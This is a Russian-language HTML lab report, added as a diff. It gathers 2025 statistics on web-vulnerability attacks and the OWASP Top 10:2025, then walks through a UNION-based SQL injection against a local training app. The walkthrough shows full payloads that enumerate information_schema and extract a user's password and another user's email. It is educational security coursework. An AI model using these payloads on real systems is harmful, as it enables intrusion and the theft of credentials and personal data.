@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Лабораторная работа 1</title>
+<style>
+  body { font-family: Georgia, 'Times New Roman', serif; font-size: 14pt; line-height: 1.7; max-width: 900px; margin: 40px auto; padding: 0 40px; color: #1a1a1a; background: #fff; }
+  h1 { font-size: 20pt; text-align: center; margin-bottom: 8px; }
+  h2 { font-size: 16pt; margin-top: 30px; border-bottom: 1px solid #ccc; padding-bottom: 4px; }
+  h3 { font-size: 14pt; margin-top: 20px; }
+  table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 12pt; }
+  th { background: #f0f0f0; border: 1px solid #999; padding: 8px 10px; text-align: left; font-weight: bold; }
+  td { border: 1px solid #999; padding: 7px 10px; vertical-align: top; }
+  code { font-family: 'Courier New', Courier, monospace; background: #f5f5f5; padding: 2px 6px; border-radius: 3px; font-size: 11pt; }
+  pre { background: #f5f5f5; border-left: 4px solid #555; padding: 12px 16px; margin: 12px 0; font-family: 'Courier New', Courier, monospace; font-size: 11pt; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+  pre code { background: none; padding: 0; }
+  hr { border: none; border-top: 1px solid #ccc; margin: 28px 0; }
+  a { color: #1a4fa3; }
+  ol, ul { padding-left: 24px; }
+  li { margin-bottom: 6px; }
+</style>
+</head>
+<body><h1>Лабораторная работа 1</h1>
+<h2>Цель</h2>
+<ol>
+<li>Собрать статистику: какую долю атак на компании проводят через веб-уязвимости, а также распределение по конкретным уязвимостям.</li>
+<li>Потренироваться на практике достать через SQL-инъекцию чувствительные данные из приложения.</li>
+</ol>
+<hr>
+<h2>Часть I. Статистика веб-уязвимостей</h2>
+<p>Для этой части я решила не ограничиваться одним источником — данные заметно расходятся в зависимости от того, какой регион и какой тип организаций изучался. Постаралась подобрать и российские, и зарубежные отчёты, чтобы картина была полнее.</p>
+<h3>Источники</h3>
+<ol>
+<li>«Актуальные киберугрозы: I–II кварталы 2025 года» — <a href="https://ptsecurity.com/research/analytics/aktual-nye-kiberugrozy-i-ii-kvartaly-2025-goda/">ptsecurity.com/research/analytics</a></li>
+<li>«Число веб-уязвимостей в 2025 году выросло в 3,2 раза» — <a href="https://rt-solar.ru/events/news/6359/">rt-solar.ru/events/news/6359</a></li>
+<li>«Отчёт об атаках на онлайн-ресурсы российских компаний в 2025 году» — <a href="https://wmx.pro/trends/issledovaniya/otchet-ob-atakakh-na-onlayn-resursy-rossiyskikh-kompaniy-v-2025-godu/">wmx.pro/trends/issledovaniya</a></li>
+<li><em>2025 Data Breach Investigations Report (DBIR)</em> — <a href="https://www.verizon.com/business/resources/reports/dbir/">verizon.com/business/resources/reports/dbir</a></li>
+<li><em>OWASP Top 10:2025</em> — <a href="https://owasp.org/Top10/2025/">owasp.org/Top10/2025</a></li>
+<li><em>Kaspersky Security Bulletin 2024–2025</em> — <a href="https://securelist.com/">securelist.com</a></li>
+</ol>
+<hr>
+<h3>Доля атак через веб-уязвимости</h3>
+<p>Честно говоря, когда я начала читать отчёты, немного удивилась разбросу цифр. Оказалось, всё дело в том, что каждый источник считает по-своему: одни смотрят только на успешные атаки, другие — на все инциденты, третьи вообще выделяют отдельно веб и инфраструктуру. Поэтому в таблице ниже я добавила колонку с пояснением, что именно измерялось.</p>
+<table>
+<thead>
+<tr>
+<th>Источник</th>
+<th>Выборка</th>
+<th>Доля атак через веб-уязвимости</th>
+<th>Примечание</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Positive Technologies</td>
+<td>Глобально, все сектора</td>
+<td>31% успешных атак использовали эксплуатацию уязвимостей</td>
+<td>Включает не только веб, но и инфраструктурные уязвимости</td>
+</tr>
+<tr>
+<td>Solar 4RAYS</td>
+<td>РФ, веб-приложения</td>
+<td>82% уязвимостей имели сетевой вектор (HTTP/SSH/SMB)</td>
+<td>Рост на 220% в 4 кв. 2025 к 1 кв.</td>
+</tr>
+<tr>
+<td>Verizon DBIR 2025</td>
+<td>Глобально, 22 тыс. инцидентов</td>
+<td>~40% брешей связаны с веб-приложениями и API</td>
+<td>Рост атак через уязвимости по сравнению с 2024</td>
+</tr>
+<tr>
+<td>WMX</td>
+<td>РФ, онлайн-ресурсы</td>
+<td>1,2 млн веб-атак за 2025 год</td>
+<td>Топ-отрасли: финансы, ИТ, ритейл</td>
+</tr>
+<tr>
+<td>Kaspersky</td>
+<td>Глобально</td>
+<td>893 млн фишинговых атак в 2024 (+26% г/г)</td>
+<td>Фишинг часто служит вектором для эксплуатации веб-уязвимостей</td>
+</tr>
+</tbody>
+</table>
+<p>Если брать <em>только успешные атаки на организации</em>, по данным Positive Technologies эксплуатация уязвимостей (включая веб) используется в 31% случаев, уступая только вредоносному ПО (63%) и социальной инженерии (50%).</p>
+<p>Для госсектора РФ доля атак через веб выше — около 21% всех успешных атак приходятся именно на госучреждения, где веб-порталы часто становятся точкой входа.</p>
+<hr>
+<h3>Распределение по конкретным уязвимостям (OWASP Top 10:2025)</h3>
+<p>OWASP обновил свой список в 2025 году, и там есть пара сдвигов по сравнению с предыдущей версией. Меня, например, удивило, что Injection теперь на 5-м месте, а не на первом — раньше это была уязвимость номер один. Зато на первое вышел Broken Access Control, что, в общем-то, логично: всё больше систем строится на API, а контроль доступа там часто настроен небрежно.</p>
+<table>
+<thead>
+<tr>
+<th>Место</th>
+<th>Уязвимость</th>
+<th>Краткое описание</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>A01: Broken Access Control</td>
+<td>Некорректная проверка прав доступа</td>
+</tr>
+<tr>
+<td>2</td>
+<td>A02: Security Misconfiguration</td>
+<td>Ошибки в настройке серверов, фреймворков</td>
+</tr>
+<tr>
+<td>3</td>
+<td>A03: Software Supply Chain Failures</td>
+<td>Уязвимости в сторонних библиотеках</td>
+</tr>
+<tr>
+<td>4</td>
+<td>A04: Cryptographic Failures</td>
+<td>Слабое шифрование, утечки ключей</td>
+</tr>
+<tr>
+<td>5</td>
+<td>A05: Injection</td>
+<td>SQLi, XSS, Command Injection</td>
+</tr>
+<tr>
+<td>6</td>
+<td>A06: Insecure Design</td>
+<td>Архитектурные просчёты на этапе проектирования</td>
+</tr>
+<tr>
+<td>7</td>
+<td>A07: Authentication Failures</td>
+<td>Слабая аутентификация, брутфорс</td>
+</tr>
+<tr>
+<td>8</td>
+<td>A08: Software/Data Integrity Failures</td>
+<td>Неверифицируемые обновления, десериализация</td>
+</tr>
+<tr>
+<td>9</td>
+<td>A09: Security Logging Failures</td>
+<td>Отсутствие мониторинга и алертинга</td>
+</tr>
+<tr>
+<td>10</td>
+<td>A10: Mishandling Exceptions</td>
+<td>Утечка информации через ошибки</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Самые популярные цели атак:</strong></p>
+<ul>
+<li>WordPress и плагины — 11% всех уязвимостей в 4 кв. 2025, более 140 багов за год</li>
+<li>Роутеры и телеком-оборудование — 5%</li>
+<li>AI-сервисы — новый тренд: 24 уязвимости за 2025 год, включая Flowise, Ray, OpenAI Codex</li>
+</ul>
+<hr>
+<h2>Часть II. Практика SQL-инъекции</h2>
+<p><strong>Задания:</strong></p>
+<ol>
+<li>Узнать пароль пользователя с ником <strong>Volk2</strong></li>
+<li>Узнать почту пользователя с ником <strong>Vinni-pukh</strong></li>
+</ol>
+<p>Перед тем как начать, я запустила Docker по инструкции и убедилась, что приложение доступно на <code>localhost:8080</code>. Дальше — по шагам.</p>
+<hr>
+<h3>Шаг 1. Базовая проверка приложения</h3>
+<p>Сначала просто посмотрела, как работает приложение в штатном режиме:</p>
+<pre><code>http://localhost:8080/task/?id=1
+</code></pre>
+<p>Результат:</p>
+<pre><code>Ваш id: 1
+Ваш логин: admin
+</code></pre>
+<p>Приложение отвечает, данные по <code>id</code> возвращаются. Всё выглядит обычно.</p>
+<hr>
+<h3>Шаг 2. Проверка на уязвимость SQL-инъекции</h3>
+<p>Добавляю одиночную кавычку в параметр — классический первый шаг при проверке на SQLi:</p>
+<pre><code>http://localhost:8080/task/?id=1'
+</code></pre>
+<p>Результат:</p>
+<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+</code></pre>
+<p>Приложение выдало необработанную ошибку MySQL прямо в браузер — это уже многое говорит. Значит, параметр <code>id</code> подставляется в SQL-запрос напрямую, без экранирования. Можно работать.</p>
+<hr>
+<h3>Шаг 3. Поиск нужных пользователей по id</h3>
+<p>Прежде чем лезть в базу через инъекцию, я решила просто перебрать несколько <code>id</code>, чтобы найти нужных пользователей — Volk2 и Vinni-pukh:</p>
+<pre><code>http://localhost:8080/task/?id=3
+</code></pre>
+<pre><code>Ваш id: 3
+Ваш логин: Matroskin
+</code></pre>
+<pre><code>http://localhost:8080/task/?id=4
+</code></pre>
+<pre><code>Ваш id: 4
+Ваш логин: Vinni-pukh
+</code></pre>
+<p>Нашла id для второго задания — <strong>Vinni-pukh имеет id=4</strong>.</p>
+<pre><code>http://localhost:8080/task/?id=9
+</code></pre>
+<pre><code>Ваш id: 9
+Ваш логин: Volk2
+</code></pre>
+<p>Нашла id для первого задания — <strong>Volk2 имеет id=9</strong>.</p>
+<hr>
+<h3>Шаг 4. Определение количества колонок в запросе</h3>
+<p>Чтобы использовать <code>UNION SELECT</code>, нужно знать, сколько колонок возвращает исходный запрос. Подбираю перебором:</p>
+<pre><code>http://localhost:8080/task/?id=1' UNION SELECT 1, 2, 3-- 
+</code></pre>
+<pre><code>Ваш id: 1
+Ваш логин: admin
+</code></pre>
+<p>Запрос прошёл без ошибки. Пробую 4:</p>
+<pre><code>http://localhost:8080/task/?id=1' UNION SELECT 1, 2, 3, 4-- 
+</code></pre>
+<pre><code>The used SELECT statements have a different number of columns
+</code></pre>
+<p><strong>3 колонки — правильное количество.</strong> На 4 получила ошибку.</p>
+<hr>
+<h3>Шаг 5. Определение отображаемой колонки</h3>
+<p>Теперь нужно понять, какая из трёх колонок выводится на страницу. Ставлю <code>id=0</code> (несуществующий), чтобы исходный запрос вернул пустоту, и заменяю одну из колонок на маркер:</p>
+<pre><code>http://localhost:8080/task/?id=0' UNION SELECT 1, 99999, 3-- 
+</code></pre>
+<pre><code>Ваш id: 1
+Ваш логин: 99999
+</code></pre>
+<p>Вторая колонка отображается на странице как «логин» — через неё и буду вытаскивать данные.</p>
+<hr>
+<h3>Шаг 6. Извлечение пароля пользователя Volk2</h3>
+<p>Подставляю поле <code>password</code> из таблицы <code>users</code> для <code>id=9</code>:</p>
+<pre><code>http://localhost:8080/task/?id=0' UNION SELECT 1, password, 3 FROM users WHERE id=9-- 
+</code></pre>
+<pre><code>Ваш id: 1
+Ваш логин: kjhsd8@j0dfjk3$%jksli
+</code></pre>
+<p><strong>✔ Задание 1 выполнено. Пароль Volk2: <code>kjhsd8@j0dfjk3$%jksli</code></strong></p>
+<hr>
+<h3>Шаг 7. Изучение структуры таблицы users</h3>
+<p>Перед тем как искать почту, я проверила, есть ли вообще колонка <code>email</code> в таблице <code>users</code>:</p>
+<pre><code>http://localhost:8080/task/?id=0' UNION SELECT 1, GROUP_CONCAT(column_name), 3
+FROM information_schema.columns WHERE table_name='users'-- 
+</code></pre>
+<pre><code>Ваш id: 1
+Ваш логин: USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password
+</code></pre>
+<p>Колонок всего три: <code>id</code>, <code>username</code>, <code>password</code>. Email здесь нет — значит, почта хранится где-то в другом месте.</p>
+<hr>
+<h3>Шаг 8. Получение списка всех таблиц в базе</h3>
+<p>Смотрю, какие ещё таблицы есть в текущей базе данных:</p>
+<pre><code>http://localhost:8080/task/?id=0' UNION SELECT 1, GROUP_CONCAT(table_name), 3
+FROM information_schema.tables WHERE table_schema=database()-- 
+</code></pre>
+<pre><code>Ваш id: 1
+Ваш логин: emails,users
+</code></pre>
+<p>Всего две таблицы: <code>users</code> и <code>emails</code>. Очевидно, email-адреса лежат в <code>emails</code>.</p>
+<hr>
+<h3>Шаг 9. Изучение структуры таблицы emails</h3>
+<pre><code>http://localhost:8080/task/?id=0' UNION SELECT 1, GROUP_CONCAT(column_name), 3
+FROM information_schema.columns WHERE table_name='emails'-- 
+</code></pre>
+<pre><code>Ваш id: 1
+Ваш логин: id,email_id
+</code></pre>
+<p>Таблица содержит колонки <code>id</code> и <code>email_id</code>. Судя по названию, <code>id</code> здесь — это тот же id пользователя, что и в таблице <code>users</code>.</p>
+<hr>
+<h3>Шаг 10. Проверка содержимого таблицы emails</h3>
+<p>Для уверенности сначала смотрю первую запись — хочу убедиться, что в <code>email_id</code> действительно лежат адреса:</p>
+<pre><code>http://localhost:8080/task/?id=0' UNION SELECT 1, email_id, 3 FROM emails-- 
+</code></pre>
+<pre><code>Ваш id: 1
+Ваш логин: admin@otus-lab.com
+</code></pre>
+<p>Да, это email администратора. Всё сходится.</p>
+<hr>
+<h3>Шаг 11. Извлечение почты пользователя Vinni-pukh</h3>
+<p>Vinni-pukh имеет <code>id=4</code> — нашла это ещё на Шаге 3. Запрашиваю email:</p>
+<pre><code>http://localhost:8080/task/?id=0' UNION SELECT 1, email_id, 3 FROM emails WHERE id=4-- 
+</code></pre>
+<pre><code>Ваш id: 1
+Ваш логин: honey_lover@otus-lab.com
+</code></pre>
+<p><strong>✔ Задание 2 выполнено. Email Vinni-pukh: <code>honey_lover@otus-lab.com</code></strong></p>
+<hr>
+<h2>Вывод</h2>
+<p>В ходе работы я на практике разобралась с SQL-инъекцией: нашла уязвимость, определила структуру базы и извлекла нужные данные. Стало понятно, что даже простая ошибка — отсутствие экранирования входных данных — даёт атакующему полный доступ к базе.</p>
+</body>
+</html>
